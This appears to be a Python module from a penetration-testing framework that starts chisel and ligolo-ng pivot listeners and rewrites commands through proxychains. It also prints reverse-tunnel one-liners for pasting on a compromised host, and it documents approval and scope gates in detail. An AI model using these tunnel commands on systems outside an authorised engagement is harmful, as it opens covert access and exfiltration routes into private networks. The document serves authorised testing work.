"""Pivot / tunnel routing (Phase 4 item 4) — chisel + ligolo-ng, already in the image.

The fixed-bridge network model has no way to route through a compromised host, which blocks
OSCP's internal segment, PNPT's internal phase and every real internal engagement. This wires
the pivoting tools (chisel, ligolo-ng, proxychains — baked into the sandbox image) into a
routing model HackPit actually understands.

THE FLOW (option 1, Zaid's decision — "manage the tunnel, rewrite before approval"):

1. START. HackPit starts the tunnel *listener* (chisel server / ligolo proxy) as a tracked
   process inside the ENGAGE sandbox, and hands back the exact one-liner to paste on the
   compromised host. HackPit cannot reach a machine it has not compromised, so delivering that
   line is the operator's one manual step (into :kali, the live-session panel, a web shell) —
   the same as Metasploit's autoroute needing the payload landed first.

2. ROUTE + REWRITE-BEFORE-APPROVAL. Once a tunnel reaches an internal subnet, a command aimed
   at that subnet is REWRITTEN — ``nmap 172.16.0.10`` becomes ``proxychains -q nmap
   172.16.0.10`` — BEFORE it reaches the approval screen, so the human approves the EXACT
   string that will run. Nothing is added behind your back (that is why option 3, silent
   routing, was rejected: it would break the one guarantee the gates rest on).

3. SCOPE BY HAND. The internal subnet enters the engagement scope ONLY by an explicit human
   amendment (:func:`engagement.add_pivot_subnet`), never automatically — recon-driven
   expansion still cannot widen scope; this is a separate, deliberate, audited path.

CONTAINMENT:

* ``route_for`` / ``wrap_command`` are PURE FUNCTIONS — no execution. They only compute the
  routed argv the human will approve, so the proposal/UI path may call them freely.
* ``start_tunnel`` / ``stop_tunnel`` run a listener process and are HUMAN-ONLY: the
  orchestrator / agent / executor have ZERO path to them (source-scan locked, like :kali and
  the repeater). A listener that an agent could raise would be an autonomous pivot.
* ``start_tunnel`` is ALSO GATED — approval + the heuristic red-confirm — through the real
  ``executor.validate_request``, before anything is spawned. See below for why that was added.
* The rewritten command still runs through the NORMAL gated executor — approve-each, scope,
  the works. Wrapping adds a prefix; it introduces NO new execution capability and no new gate
  bypass. A proxychained command to an internal host is refused unless that subnet was added to
  scope by hand.

WHY THE LISTENER START IS GATED (finding I2, gate audit 2026-07-27). This module used to reach
``subprocess.Popen`` directly with no ``validate_request`` call, and ``POST /cockpit/tunnels``
carried no ``approved`` / ``dangerous_ack`` field at all. The bullet above about the rewritten
command was true and beside the point: **the listener start is the tunnel primitive.** A tunnel
is a C2 path and an exfil path in one, moving arbitrary traffic to somewhere the operator has
not been gated against — and it was raised by a plain POST. Human-only was the ONLY bound on
it, which is strictly less than every other execution surface in the cockpit gets.

This was originally the exception to D17's split (C2 *lifecycle* human-only, artifact
*generation* gated), on the grounds that starting a listener nothing has connected to yet is
inert while a pivot listener's whole purpose is to become a route into a network the scope gate
has never seen. Build #7 finished the job: the DNS-tunnel listener and the Sliver C2 server were
both gated the same way, the first because I2's argument applied to it verbatim (a covert
channel IS an exfil route) and the second because a Sliver daemon can bring up persisted
listener jobs. All three lifecycle surfaces now require engagement + approval + red-confirm; the
split that remains is the TARGET, which only implant generation has.


THE LISTENER'S STATUS IS NOW OBSERVED, NOT ASSIGNED (build #7). ``start_tunnel`` used to set
``status="listening"`` the instant ``Popen`` returned. For ligolo that was simply false:
``ligolo-proxy`` is an interactive CONSOLE, and ``docker exec`` without ``-i`` hands it a closed
stdin, so it printed its banner, read EOF and exited 0 — while the panel said the pivot was live.
The start now goes through ``cockpit/lifecycle.py``, which gives a console binary a stdin that
does not end, drains its output so it cannot wedge, and then LOOKS: a listener is reported
``listening`` only once ``ss`` inside the container confirms the port is bound, ``starting`` if
the process is up but the bind is unconfirmed, and a process that died is a REFUSAL — the caller
is told nothing is listening rather than handed a fiction. See that module for why the stdin it
holds open is a raw fd with no writer object attached.

CHISEL IS A DAEMON, LIGOLO IS A CONSOLE, and that difference is load-bearing rather than
cosmetic. chisel's server needs no stdin and completes a pivot end-to-end without one: the agent
connects, a SOCKS5 proxy comes up on this box and ``wrap_command`` routes through it. ligolo
routes at the interface, and selecting a session and typing ``start`` are CONSOLE commands —
HackPit holds that console's stdin open so the proxy survives, but deliberately never types into
it (that would be an unapproved command on a live C2 console). Completing a ligolo session is
therefore the operator's own step, the same way the agent one-liner is.
"""

from __future__ import annotations

import ipaddress
import subprocess
import threading
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone

from pydantic import BaseModel, Field, field_validator

from . import config, lifecycle

# Bounds — a listener should not accumulate forever.
MAX_LIVE_TUNNELS = int(__import__("os").environ.get("HACKPIT_MAX_TUNNELS", "4"))

# Default ports. chisel: reverse SOCKS server; the agent's R:socks exposes a SOCKS5 on the
# SERVER at 127.0.0.1:1080, which proxychains then points at. ligolo: the proxy control port.
# Defined in cockpit/listener_ports.py so cockpit/exposure.py can learn a listener's port
# WITHOUT importing this module — the human-only scan below allows only two files to reach it,
# and a port is configuration, not behaviour. Re-exported so every existing reference stands.
from .listener_ports import (  # noqa: E402
    CHISEL_DEFAULT_PORT,
    CHISEL_SOCKS_PORT,
    LIGOLO_DEFAULT_PORT,
)


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# --------------------------------------------------------------------------- #
# models
# --------------------------------------------------------------------------- #
class TunnelStartRequest(BaseModel):
    """Start a pivot listener. NO container field — the box is a constant (engage sandbox)."""

    kind: str = Field("chisel", description="chisel | ligolo.")
    lhost: str = Field(
        ..., min_length=1,
        description="The address the compromised host will connect BACK to — your VPN/tun IP as "
        "the victim sees it. Goes into the agent one-liner, never used to exec anything.",
    )
    listen_port: int | None = Field(None, ge=1, le=65535)
    subnets: list[str] = Field(
        default_factory=list,
        description="The internal CIDR(s) this tunnel will reach once the agent connects, e.g. "
        "172.16.0.0/24. Used for route resolution; adding them to SCOPE is a separate step.",
    )
    engagement_id: str | None = Field(None, description="Engagement to associate + record against.")
    # THE GATE FIELDS. Both default False, so a client that omits them is REFUSED rather than
    # allowed — a default of True would mean an omitted field silently grants exactly what the
    # field was added to require.
    approved: bool = Field(
        False,
        description="Explicit human approval for starting this listener. Never defaulted true, "
        "never batched — a pivot listener is an execution, not a lifecycle no-op.",
    )
    dangerous_ack: bool = Field(
        False,
        description="The explicit red-confirm. A tunnel is a C2 path and an exfil path in one, "
        "so the danger heuristic always flags the server binary and this is always required.",
    )

    @field_validator("kind")
    @classmethod
    def _kind_ok(cls, v: str) -> str:
        v = v.strip().lower()
        if v not in ("chisel", "ligolo"):
            raise ValueError("kind must be 'chisel' or 'ligolo'")
        return v

    @field_validator("subnets")
    @classmethod
    def _subnets_ok(cls, v: list[str]) -> list[str]:
        out = []
        for s in v:
            s = str(s).strip()
            if not s:
                continue
            ipaddress.ip_network(s, strict=False)  # raises on a bad CIDR
            out.append(s)
        return out


class Tunnel(BaseModel):
    """One live (or starting) pivot tunnel."""

    id: str
    kind: str
    routing: str = Field(description="'socks' (proxychains) or 'interface' (ip route via tun).")
    lhost: str
    listen_port: int
    socks_port: int | None = None
    subnets: list[str] = Field(default_factory=list)
    status: str = Field(
        description="starting | listening | down — OBSERVED after the settle window, never "
        "assigned at spawn time. 'listening' means the port was confirmed bound inside the "
        "container; 'starting' means the process is up but the bind is unconfirmed."
    )
    agent_command: str = Field(description="The one-liner to paste on the compromised host.")
    setup_note: str = ""
    liveness: str = Field(
        "", description="What was actually observed about the server process and its port."
    )
    started_at: str
    engagement_id: str | None = None


class TunnelRefused(RuntimeError):
    """The listener could not start / the request was invalid. Nothing runs.

    Carries the GATE that refused it, so the route can map a safety refusal (403) apart from an
    availability problem (409) instead of collapsing both into one status. ``dangerous_flags``
    is populated when the danger gate refused, so the UI can render WHY rather than a generic
    banner — the same discipline the WinRM confirm follows.
    """

    def __init__(self, reason: str, gate: str = "unavailable",
                 dangerous_flags: list[str] | None = None):
        super().__init__(reason)
        self.reason = reason
        self.gate = gate
        self.dangerous_flags = dangerous_flags or []


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #
@dataclass
class _LiveTunnel:
    model: Tunnel
    watched: "lifecycle.Watched | None" = field(default=None)
    # The server argv, kept so a stop can reap the process INSIDE the container. Killing the
    # `docker exec` client does not stop what it started — see lifecycle.Watched.kill.
    server_argv: list[str] = field(default_factory=list)

    @property
    def proc(self):
        """The spawned server process, or None. Read-only view for liveness refresh."""
        return self.watched.proc if self.watched is not None else None


_tunnels: dict[str, _LiveTunnel] = {}
_lock = threading.Lock()


def _container_running(name: str) -> bool:
    try:
        p = subprocess.run(
            ["docker", "inspect", "-f", "{{.State.Running}}", name],
            capture_output=True, text=True, timeout=10.0,
        )
        return p.returncode == 0 and p.stdout.strip() == "true"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


# --------------------------------------------------------------------------- #
# one-liner + server argv per tool
# --------------------------------------------------------------------------- #
def _chisel_plan(req: TunnelStartRequest) -> tuple[list[str], str, str, int]:
    """(server_argv, agent_oneliner, setup_note, socks_port) for a chisel reverse-SOCKS tunnel."""
    port = req.listen_port or CHISEL_DEFAULT_PORT
    server_argv = ["chisel", "server", "-p", str(port), "--reverse", "--socks5"]
    agent = f"chisel client {req.lhost}:{port} R:socks"
    note = (
        f"Paste the agent line on the compromised host. It opens a SOCKS5 proxy on THIS box at "
        f"127.0.0.1:{CHISEL_SOCKS_PORT}; commands to the internal subnet are rewritten to run "
        f"through it with `proxychains`."
    )
    return server_argv, agent, note, CHISEL_SOCKS_PORT


def _ligolo_plan(req: TunnelStartRequest) -> tuple[list[str], str, str, int | None]:
    """(server_argv, agent_oneliner, setup_note, None) for a ligolo-ng tunnel (interface routing)."""
    port = req.listen_port or LIGOLO_DEFAULT_PORT
    server_argv = ["ligolo-proxy", "-selfcert", "-laddr", f"0.0.0.0:{port}"]
    agent = f"ligolo-agent -connect {req.lhost}:{port} -ignore-cert"
    routes = " ; ".join(f"ip route add {s} dev ligolo" for s in req.subnets) or \
        "ip route add <subnet> dev ligolo"
    note = (
        "Paste the agent line on the compromised host, then in the ligolo proxy console "
        "`session` → select it → `start`. ligolo routes at the INTERFACE (a `ligolo` tun), so "
        f"add the route(s) on this box: {routes}. Commands then run UNWRAPPED — no proxychains. "
        "NOTE: HackPit holds this console's stdin open so the proxy stays up, but never types "
        "into it — `session`/`start` are yours to run on your own console. A pivot that must "
        "complete without one wants kind='chisel', whose server needs no console at all."
    )
    return server_argv, agent, note, None


# --------------------------------------------------------------------------- #
# the gate — approval + the heuristic red-confirm, before anything spawns
# --------------------------------------------------------------------------- #
def server_argv_for(req: TunnelStartRequest) -> list[str]:
    """The listener argv this request will run. THE SINGLE DERIVATION.

    Both the gate and :func:`start_tunnel` come through here, for the same reason the WinRM
    path funnels through one join: classifying a DIFFERENT argv than the one that executes
    reproduces the bug in a new place. A test asserts the gated argv and the spawned argv are
    equal.
    """
    plan = _chisel_plan(req) if req.kind == "chisel" else _ligolo_plan(req)
    return list(plan[0])


def needs_console_stdin(kind: str) -> bool:
    """Does this tool's server need a stdin that never ends? PURE.

    ``ligolo-proxy`` is an interactive console and dies on EOF; ``chisel server`` is a plain
    daemon and needs no stdin at all. Least privilege per binary rather than one blanket default
    — see cockpit/lifecycle.py.
    """
    return kind == "ligolo"


def _gate_request(req: TunnelStartRequest) -> "ExecRequest":
    """The ExecRequest the real gates run against.

    Surface: the SERVER BINARY (which drives the danger heuristic — ``chisel`` and
    ``ligolo-proxy`` are both in ``allowlist._TUNNEL_TOOLS``, so a listener start always demands
    the red-confirm) plus the engagement.

    ``lhost`` is deliberately NOT in the gate surface. It is the OPERATOR's own callback address
    — the VPN IP the victim dials back to — not a target, and scope-gating it would refuse the
    operator's own machine. Same reasoning that keeps ``<listener>`` from ever being rewritten
    to the target in the arsenal templates.

    ``subnets`` are deliberately not gated here either, and that is not a gap: an internal
    subnet enters engagement scope ONLY through the explicit, audited
    ``engagement.add_pivot_subnet``. Gating them at start would duplicate that decision in a
    place where refusing is meaningless — the tunnel does not reach them until an agent
    connects, and the commands that DO reach them are gated one at a time, by scope, as always.

    THE SERVER'S OWN FLAGS ARE ALSO NOT IN THE SURFACE, and leaving them out is deliberate
    rather than lazy. A listener has no target: its arguments are a bind address and a port
    (``-laddr 0.0.0.0:11601``). The scope extractor reads any dotted token as a hostname, so
    feeding them in makes the gate refuse ``0.0.0.0`` as an out-of-scope host — a refusal about
    the operator's own socket, which teaches nothing and would train a workaround. Nothing is
    weakened: the danger verdict comes from the BINARY (both server binaries are in
    ``allowlist._TUNNEL_TOOLS``, so the red-confirm always fires), and the only values that
    could be network-facing — the internal subnets — are governed by the scope amendment.
    """
    from .models import ExecRequest

    argv = server_argv_for(req)
    return ExecRequest(
        command=argv[0],
        args=[],
        approved=req.approved,
        dangerous_ack=req.dangerous_ack,
        engagement_id=req.engagement_id,
    )


def validate_start(req: TunnelStartRequest):
    """The gate verdict for starting this listener, spawning nothing. PURE.

    A TUNNEL START NOW REQUIRES AN ENGAGEMENT, which is a deliberate tightening rather than a
    side effect. Without one the request would resolve to LAB mode, and lab mode's isolation
    gate proves the LAB sandbox is egress-less — a property of a container this listener does
    not run in. Firing a gate on an unrelated condition is its own kind of dishonesty: the
    operator would be told to prove the lab is isolated in order to start a pivot into a client
    network. Engagement mode is the coherent home for it — no isolation floor (correct, the
    target is real), scope enforced per command, and the pivot subnet's scope amendment already
    demanded an engagement id anyway.
    """
    from . import executor
    from .models import ExecRejected

    if not req.engagement_id:
        return ExecRejected(
            reason="a pivot listener must name an engagement — it is a route into a real "
            "network, so it is attributed and scoped like every other engagement action "
            "(and its subnets can only enter scope through that engagement's amendment)",
            gate="engagement",
        )
    return executor.validate_request(_gate_request(req))


# --------------------------------------------------------------------------- #
# lifecycle — HUMAN-ONLY *and* GATED
# --------------------------------------------------------------------------- #
def start_tunnel(req: TunnelStartRequest) -> Tunnel:
    """Start a pivot listener in the ENGAGE sandbox and return it + the agent one-liner.

    HUMAN-ONLY (route-driven) AND GATED. The chisel/ligolo *server* runs inside the engage
    sandbox; the real ``executor.validate_request`` runs FIRST, so an unapproved or
    un-red-confirmed start is refused with NOTHING spawned. Also refuses if the sandbox is down
    or the live cap is hit; nothing runs on any refusal.
    """
    rejected = validate_start(req)
    if rejected is not None:
        raise TunnelRefused(rejected.reason, gate=rejected.gate,
                            dangerous_flags=list(rejected.dangerous_flags))

    if not _container_running(config.ENGAGE_SANDBOX_CONTAINER):
        raise TunnelRefused(
            f"engage sandbox '{config.ENGAGE_SANDBOX_CONTAINER}' is not running — bring the "
            "stack up (docker compose -f docker/docker-compose.yml up -d)"
        )
    with _lock:
        live = sum(1 for t in _tunnels.values() if t.model.status != "down")
        if live >= MAX_LIVE_TUNNELS:
            raise TunnelRefused(f"too many live tunnels ({live}/{MAX_LIVE_TUNNELS}) — stop one first",
                                gate="limit")

    if req.kind == "chisel":
        _server_argv, agent, note, socks = _chisel_plan(req)
        routing, port = "socks", (req.listen_port or CHISEL_DEFAULT_PORT)
    else:
        _server_argv, agent, note, socks = _ligolo_plan(req)
        routing, port = "interface", (req.listen_port or LIGOLO_DEFAULT_PORT)

    tid = uuid.uuid4().hex[:12]
    # Through server_argv_for, NOT the local plan tuple: the argv that runs must be the argv
    # the gate above classified.
    interactive = needs_console_stdin(req.kind)
    argv = lifecycle.exec_argv(
        config.ENGAGE_SANDBOX_CONTAINER, server_argv_for(req), interactive=interactive
    )
    try:
        watched = lifecycle.spawn_watched(argv, interactive=interactive)
    except FileNotFoundError:
        raise TunnelRefused("docker CLI not found on PATH")

    # *** LOOK BEFORE REPORTING. *** The status below is what was observed after the settle
    # window, not what was assumed at spawn time. A listener that died is a refusal: the operator
    # must not be handed a live-looking tunnel and an agent one-liner for a port with nothing
    # behind it.
    live = lifecycle.observe(
        watched, container=config.ENGAGE_SANDBOX_CONTAINER, port=port, proto="tcp"
    )
    if not live.alive:
        watched.kill()
        raise TunnelRefused(
            f"the {req.kind} listener did not stay up — {live.detail}", gate="unavailable"
        )

    model = Tunnel(
        id=tid, kind=req.kind, routing=routing, lhost=req.lhost, listen_port=port,
        socks_port=socks, subnets=list(req.subnets), status=live.status,
        agent_command=agent, setup_note=note, liveness=live.detail,
        started_at=_now(), engagement_id=req.engagement_id,
    )
    with _lock:
        _tunnels[tid] = _LiveTunnel(model=model, watched=watched,
                                    server_argv=server_argv_for(req))
    return model


def list_tunnels() -> list[Tunnel]:
    """Every tunnel (starting/listening/down), re-observing liveness. Read-only.

    The refresh moves in BOTH directions: a dead process becomes ``down``, and a ``starting``
    listener whose port has since appeared becomes ``listening``. It used to only demote, which
    left a listener that bound just after its settle window stuck on ``starting`` — and
    :func:`route_for` will not route through one of those.
    """
    with _lock:
        live = list(_tunnels.values())
    for lt in live:
        if lt.model.status == "down":
            continue
        lt.model.status = lifecycle.refresh_status(
            lt.watched, lt.model.status,
            container=config.ENGAGE_SANDBOX_CONTAINER, port=lt.model.listen_port, proto="tcp",
        )
    return [lt.model for lt in live]


def get_tunnel(tid: str) -> Tunnel | None:
    with _lock:
        lt = _tunnels.get(tid)
    return lt.model if lt else None


def stop_tunnel(tid: str) -> Tunnel:
    """Stop a listener (kill its process). HUMAN-ONLY. Never raises for an already-down tunnel."""
    with _lock:
        lt = _tunnels.get(tid)
    if lt is None:
        raise TunnelRefused(f"no tunnel {tid}")
    if lt.watched is not None:
        # EOF first (a console binary leaves politely), then kill the client, then reap the
        # server inside the container — killing `docker exec` does not stop what it started.
        lt.watched.kill(container=config.ENGAGE_SANDBOX_CONTAINER, server_argv=lt.server_argv)
    lt.model.status = "down"
    return lt.model


# --------------------------------------------------------------------------- #
# routing + rewrite — PURE (safe for the proposal/UI path; execute nothing)
# --------------------------------------------------------------------------- #
def _host_in_subnets(host: str, subnets: list[str]) -> bool:
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return False
    for s in subnets:
        try:
            if ip in ipaddress.ip_network(s, strict=False):
                return True
        except ValueError:
            continue
    return False


def route_for(host: str, tunnels: list[Tunnel] | None = None) -> Tunnel | None:
    """The live tunnel whose subnets cover ``host`` (an IP), or None. Pure — nothing runs.

    A hostname (not an IP) returns None: routing is decided on the numeric address, never by
    resolving a name (same discipline as the scope matcher — no resolve-to-decide leak).
    """
    pool = tunnels if tunnels is not None else list_tunnels()
    for t in pool:
        if t.status == "listening" and _host_in_subnets(host, t.subnets):
            return t
    return None


# Commands whose FIRST token is the tool proxychains would wrap. A shell builtin or a tool that
# does its own socket setup (already SOCKS-aware) is left alone.
def wrap_command(command: str, args: list[str], tunnel: Tunnel) -> tuple[str, list[str], str]:
    """Rewrite ``(command, args)`` to route through ``tunnel``. Pure — returns the new argv.

    * SOCKS tunnels (chisel): prefix ``proxychains -q`` so TCP goes through the tunnel's SOCKS5.
      The returned command IS what the human approves — the prefix is visible, not hidden.
    * INTERFACE tunnels (ligolo): the OS route (``ip route add … dev ligolo``) does the work, so
      the command is returned UNCHANGED with a note that the route must be up.
    """
    if tunnel.routing == "interface":
        return command, list(args), (
            f"via ligolo tunnel {tunnel.id} — runs unwrapped; ensure `ip route add <subnet> dev "
            f"ligolo` is set (see the tunnel's setup note)."
        )
    # SOCKS: proxychains as the new command, the original command+args as its arguments.
    if command == "proxychains" or command == "proxychains4":
        return command, list(args), f"already proxychained (tunnel {tunnel.id})"
    new_args = ["-q", command, *args]
    return "proxychains", new_args, f"via chisel SOCKS tunnel {tunnel.id} (127.0.0.1:{tunnel.socks_port})"


def status() -> dict:
    """Availability of the tunnels' sandbox — drives the UI banner."""
    up = _container_running(config.ENGAGE_SANDBOX_CONTAINER)
    return {
        "container": config.ENGAGE_SANDBOX_CONTAINER,
        "up": up,
        "live_tunnels": sum(1 for t in list_tunnels() if t.status == "listening"),
        "detail": "" if up else "engage sandbox container is not running",
    }


def reset() -> None:  # test helper
    with _lock:
        for lt in _tunnels.values():
            if lt.watched is not None:
                lt.watched.kill(container=config.ENGAGE_SANDBOX_CONTAINER,
                                server_argv=lt.server_argv)
        _tunnels.clear()
